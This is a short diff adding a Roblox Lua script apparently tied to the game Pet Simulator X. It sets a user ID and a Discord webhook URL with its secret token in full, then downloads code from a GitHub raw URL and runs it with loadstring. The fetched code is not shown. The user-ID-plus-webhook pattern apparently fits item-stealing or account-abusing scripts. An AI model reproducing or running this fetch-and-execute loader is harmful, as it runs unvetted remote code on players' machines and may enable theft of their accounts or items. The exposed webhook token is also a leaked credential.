@@ -1,0 +1,3 @@
+_G.UserID = 3266582842
+_G.WebHook = "https://discord.com/api/webhooks/1038771989931901008/LV9C_9p9gXS25tHqbRk6Ji1RFTpVh7PV0IGw4jVwxGfDhObRVc6IMnlqtUJHL7OTE5uy"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
